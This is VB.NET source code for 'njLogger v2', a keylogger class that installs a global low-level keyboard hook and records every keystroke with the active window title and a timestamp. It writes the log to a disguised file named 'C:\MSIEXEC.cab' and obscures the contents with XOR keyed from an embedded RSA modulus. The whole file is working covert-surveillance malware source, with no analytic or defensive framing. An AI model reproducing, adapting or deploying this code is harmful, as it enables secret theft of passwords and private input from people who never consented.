Imports System.Runtime.InteropServices
Imports System.IO
Imports System.Xml
Imports System.Windows.Forms

Public Class KLogger
    '##### njLogger v2 , 2012-2-12
    '##### Coded By njQ8, modified by Henry (chocolatkey)
    '##### Keyboard Hook By (Eprouvez,Deathader)
    '##### You Cant Test This In Debug Mode..,Compile it First!! Or UnCheck "Enable the Visual Studio hosting process"
    Public Logs As String = "" '<<<<<<<<<< you Read Logs By this 
    Public isRunning As Boolean = False
    Public MaxLength As Integer = 100000 * 1024 ' Max Logs Size 100MB
    Private Stream As IO.StreamWriter
    Dim o = My.Computer.Clock.LocalTime
    Public LogsPath As String = "C:\MSIEXEC" & ".cab"
    Public pk = "<RSAKeyValue><Modulus>oQS+MurZhAp2kYh7VWeyMZrwYmmpW5GYW+WW2V74YZqobBYkD6gTnI0XfOL2NRtv46IgYPZvB7mWG7af+hAYkb+0uUu/8DGJ2VAV1AyEKAzrv0bzXk10n28npYuE5jBvACl1Im+LNG8lgcNZe8AkPa1eVN6HrziD8GDgF+Ib+XCnUcA3piFf3mleVvyK2svUO2dFb2rYJTLpnIRkHHlO9wSbHIT51hcMmy9mZIG/O2xR7smtKHwEDFDIUor6BhCiWM2BBcHPzQEcL7qBL1Tie9Kd8CAB2YMRybaEWvU1rS1WNf+CBN2eWNGd3H5GTn8enZjG5szr7C5UV8HYDRPUGrnTsfVUUVQKKnn+DR4RusegfsWLCuIhfKkrZZWDmhw/WWgZWiAvbNl51rsqD1Cr8ILcOTgaOztXSoC0NkVCzDiNIqqeSZ+LhT+ML8G3TLe0C2noYomBEcG2QogC462dgT7mTO0OYaUnhV9DTiU0pPj9bXYfotnL0sLPM/FXBTK3O41resBiEeOKi2qMHsIQCyNRY7PnuFeb/y7MMWv+QPpGlcZoiN6t8ntoIZlYSdmVaAy8qOVs0Vfh8ZICXjkvmv68JnSCCOezbjxMOCiVbTpxxcDKThom1Km6n3gBOhuZjd6QJeXZwnQBpsKRcFD0UxkzlltaMFPItu3RyhAI/90=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>"
    Dim xmldoc As New XmlDataDocument()
    Public Shared modulus As String

    Function SB(ByVal s As String) As Byte() ' string to byte()
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function

    Public Sub Start()
        If isRunning = True Then Exit Sub
        Try
            Logs = IO.File.ReadAllText(LogsPath)
        Catch ex As Exception
            ''MsgBox(ex.Message & ex.StackTrace)
        End Try
        xmldoc.LoadXml(pk)
        modulus = xmldoc.GetElementsByTagName("RSAKeyValue").Item(0).InnerText

        Stream = IO.File.AppendText(LogsPath)
        Stream.AutoFlush = True
        HHookID = SetWindowsHookEx(WH_KEYBOARD_LL, KBDLLHookProcDelegate, System.Runtime.InteropServices.Marshal.GetHINSTANCE(Reflection.Assembly.GetExecutingAssembly.GetModules()(0)).ToInt32, 0)
        Dim t As New Threading.Thread(AddressOf WRK, 1)
        t.Start()
    End Sub
    Private OFF As Boolean = False
    Public Sub Close(ByVal DeleteLogs As Boolean)
        OFF = True
        Do Until isRunning = False
            Threading.Thread.Sleep(1)
        Loop
        If DeleteLogs = True Then
            Threading.Thread.Sleep(1000)
            Try
                IO.File.Delete(LogsPath)
            Catch ex As Exception
            End Try
            Logs = ""
        End If
        OFF = False
    End Sub
    Private LastAV As Integer ' Last Active Window Handle
    Private LastAS As String ' Last Active Window Title
    Private lastKey As Keys = Nothing
    Private Function AV() As String ' Get Active Window
        Try
            Dim o = GetForegroundWindow
            Dim id As Integer
            GetWindowThreadProcessId(o, id)
            Dim p As Process = Process.GetProcessById(id)
            If o.ToInt32 = LastAV And LastAS = p.MainWindowTitle Then
                Return ""
            Else
                LastAV = o.ToInt32
                LastAS = p.MainWindowTitle.ToString
                ''Return "<br><br><b>[" & LastAS & "] " & HM() & "</b><br>"
                Return vbNewLine & vbNewLine & "<b>[" & LastAS & "] " & HM() & "</b>" & vbNewLine
            End If
        Catch ex As Exception
            Return ""
        End Try
    End Function
    Private Function HM() As String
        Dim oo = My.Computer.Clock.LocalTime
        Return oo.Year & "/" & oo.Month & "/" & oo.Day & " " & New String(oo.Hour.ToString).PadLeft(2, "0") & ":" & New String(oo.Minute.ToString).PadLeft(2, "0") & ":" & New String(oo.Second.ToString).PadLeft(2, "0")
    End Function
    Private Sub WRK()
        isRunning = True
        Try
            Do Until OFF = True
                Try
                    Threading.Thread.Sleep(1)
                    For i As Integer = 0 To Isdown.Length - 1
                        If Isdown(i) Then
                            Isdown(i) = False
                            Dim s As String = AV() & Fix(i)
                            lastKey = i
                            s = Xord(s, Crc32.ComputeChecksum(SB(modulus))) ''Xor with crc32 of public key modulus as password
                            Logs += s
                            Stream.Write(s)
                            If Logs.Length > MaxLength Then
                                Logs = Logs.Remove(0, Logs.Length - MaxLength)
                                Stream.Close()
                                Stream.Dispose()
                                IO.File.WriteAllText(LogsPath, Logs)
                                Stream = IO.File.AppendText(LogsPath)
                                Stream.AutoFlush = True
                            End If
                        End If
                    Next
                Catch ex As Exception
                End Try
            Loop
        Catch ex As Exception
        End Try
        Try
            Stream.Close()
        Catch ex As Exception
        End Try
        Try
            Stream.Dispose()
        Catch ex As Exception
        End Try
        isRunning = False
    End Sub
#Region "API"
    <DllImport("user32.dll")>
    Private Shared Function ToUnicodeEx(ByVal wVirtKey As UInteger, ByVal wScanCode As UInteger, ByVal lpKeyState As Byte(), <Out(), MarshalAs(UnmanagedType.LPWStr)> ByVal pwszBuff As System.Text.StringBuilder, ByVal cchBuff As Integer, ByVal wFlags As UInteger,
  ByVal dwhkl As IntPtr) As Integer
    End Function
    <DllImport("user32.dll")>
    Private Shared Function GetKeyboardState(ByVal lpKeyState As Byte()) As Boolean
    End Function
    <DllImport("user32.dll")>
    Private Shared Function MapVirtualKey(ByVal uCode As UInteger, ByVal uMapType As UInteger) As UInteger
    End Function
    <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)>
    Private Overloads Shared Function SetWindowsHookEx(ByVal idHook As Integer, ByVal HookProc As KBDLLHookProc, ByVal hInstance As IntPtr, ByVal wParam As Integer) As Integer
    End Function
    <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)>
    Private Overloads Shared Function CallNextHookEx(ByVal idHook As Integer, ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As Integer
    End Function
    <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)>
    Private Overloads Shared Function UnhookWindowsHookEx(ByVal idHook As Integer) As Boolean
    End Function
    Private Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
    Private Declare Function GetKeyboardLayout Lib "user32" (ByVal dwLayout As Integer) As Integer
    Private Declare Function GetForegroundWindow Lib "user32" () As IntPtr
#End Region
    Private Isdown(255) As Boolean
    Private Function Fix(ByVal k As Keys) As String
        Dim isuper As Boolean = My.Computer.Keyboard.ShiftKeyDown
        If My.Computer.Keyboard.CapsLock = True Then
            If isuper = True Then
                isuper = False
            Else
                isuper = True
            End If
        End If
        Try
            Select Case k
                Case Keys.F1, Keys.F2, Keys.F3, Keys.F4, Keys.F5, Keys.F6, Keys.F7, Keys.F8, Keys.F9, Keys.F10, Keys.F11, Keys.F12, Keys.End, Keys.Delete, Keys.Back, Keys.Alt
                    Return "<span class=""f"">[" & k.ToString & "]</span>"
                Case Keys.LShiftKey, Keys.RShiftKey, Keys.Shift, Keys.ShiftKey, Keys.Control, Keys.ControlKey, Keys.RControlKey, Keys.LControlKey
                    Return ""
                Case Keys.Space
                    Return " "
                Case Keys.Enter, Keys.Return
                    If lastKey = k Then Return ""
                    Return "<span class=""k"">[ENTER]</span>"
                Case Keys.Tab
                    If lastKey = k Then Return ""
                    Return "<span  class=""k"">[TAB]</span>"
                Case Else
                    If isuper = True Then
                        Return VKCodeToUnicode(k).ToUpper
                    Else
                        Return VKCodeToUnicode(k)
                    End If
            End Select
        Catch ex As Exception
            If isuper = True Then
                Return ChrW(k).ToString.ToUpper
            Else
                Return ChrW(k).ToString.ToLower
            End If
        End Try
    End Function
    Private Shared Function VKCodeToUnicode(ByVal VKCode As UInteger) As String
        Try
            Dim sbString As New System.Text.StringBuilder()
            Dim bKeyState As Byte() = New Byte(254) {}
            Dim bKeyStateStatus As Boolean = GetKeyboardState(bKeyState)
            If Not bKeyStateStatus Then
                Return ""
            End If
            Dim lScanCode As UInteger = MapVirtualKey(VKCode, 0)
            Dim h As IntPtr = GetForegroundWindow()
            Dim id As Integer = 0
            Dim Aid As Integer = GetWindowThreadProcessId(h, id)
            Dim HKL As IntPtr = GetKeyboardLayout(Aid)
            ToUnicodeEx(VKCode, lScanCode, bKeyState, sbString, CInt(5), CUInt(0),
             HKL)
            Return sbString.ToString()
        Catch ex As Exception
        End Try
        Return CType(VKCode, Keys).ToString
    End Function
#Region "KeyHook"
    <StructLayout(LayoutKind.Sequential)>
    Private Structure KBDLLHOOKSTRUCT
        Public vkCode As UInt32
        Public scanCode As UInt32
        Public flags As KBDLLHOOKSTRUCTFlags
        Public time As UInt32
        Public dwExtraInfo As UIntPtr
    End Structure
    <Flags()>
    Private Enum KBDLLHOOKSTRUCTFlags As UInt32
        LLKHF_EXTENDED = &H1
        LLKHF_INJECTED = &H10
        LLKHF_ALTDOWN = &H20
        LLKHF_UP = &H80
    End Enum
    Private Const WH_KEYBOARD_LL As Integer = 13
    Private Const HC_ACTION As Integer = 0
    Private Const WM_SYSKEYDOWN = &H104
    Private Const WM_SYSKEYUP = &H105
    Private Delegate Function KBDLLHookProc(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As Integer
    Private KBDLLHookProcDelegate As KBDLLHookProc = New KBDLLHookProc(AddressOf KeyboardProc)
    Private HHookID As IntPtr = IntPtr.Zero
    Private Const WM_KEYDOWN = &H100
    Private Const WM_KEYUP = &H101
    Private Function KeyboardProc(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As Integer
        If (nCode = HC_ACTION) Then
            Dim struct As KBDLLHOOKSTRUCT
            Select Case wParam
                Case WM_KEYDOWN, WM_SYSKEYDOWN
                    Dim k = (CType(CType(Marshal.PtrToStructure(lParam, struct.GetType()), KBDLLHOOKSTRUCT).vkCode, Keys))
                    Isdown(k) = True
                Case WM_KEYUP, WM_SYSKEYUP
                    Dim k = (CType(CType(Marshal.PtrToStructure(lParam, struct.GetType()), KBDLLHOOKSTRUCT).vkCode, Keys))
                    Isdown(k) = False
            End Select
        End If
        Return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam)
    End Function
#End Region

    Public Function Xord(ByVal str As String, ByVal key As String)
        Dim i As Short
        Xord = ""
        Dim KeyChar As Integer
        KeyChar = Asc(key)
        For i = 1 To Len(str)
            Xord &=
               Chr(KeyChar Xor
               Asc(Mid(str, i, 1)))
        Next
    End Function
End Class

Public Class Crc32
    Shared table As UInteger()

    Shared Sub New()
        Dim poly As UInteger = &HEDB88320UI
        table = New UInteger(255) {}
        Dim temp As UInteger = 0
        For i As UInteger = 0 To table.Length - 1
            temp = i
            For j As Integer = 8 To 1 Step -1
                If (temp And 1) = 1 Then
                    temp = CUInt((temp >> 1) Xor poly)
                Else
                    temp >>= 1
                End If
            Next
            table(i) = temp
        Next
    End Sub

    Public Shared Function ComputeChecksum(bytes As Byte()) As UInteger
        Dim crc As UInteger = &HFFFFFFFFUI
        For i As Integer = 0 To bytes.Length - 1
            Dim index As Byte = CByte(((crc) And &HFF) Xor bytes(i))
            crc = CUInt((crc >> 8) Xor table(index))
        Next
        Return Not crc
    End Function
End Class